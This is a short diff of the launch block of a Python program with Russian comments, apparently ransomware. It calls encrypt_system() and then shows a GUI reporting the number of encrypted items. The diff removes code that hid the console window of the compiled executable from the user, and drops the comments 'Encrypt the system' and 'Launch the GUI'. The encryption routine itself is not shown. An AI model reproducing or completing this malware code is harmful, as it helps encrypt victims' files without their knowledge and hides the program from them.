@@ -173,16 +173,7 @@ def show_gui(encrypted_count):
 
 # ===== ЗАПУСК =====
 if __name__ == "__main__":
-    # Скрытие консоли в EXE
-    if getattr(sys, 'frozen', False):
-        try:
-            import ctypes
-            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-        except:
-            pass
-    
-    # Шифруем систему
+
     count = encrypt_system()
     
-    # Запускаем GUI
     show_gui(count)
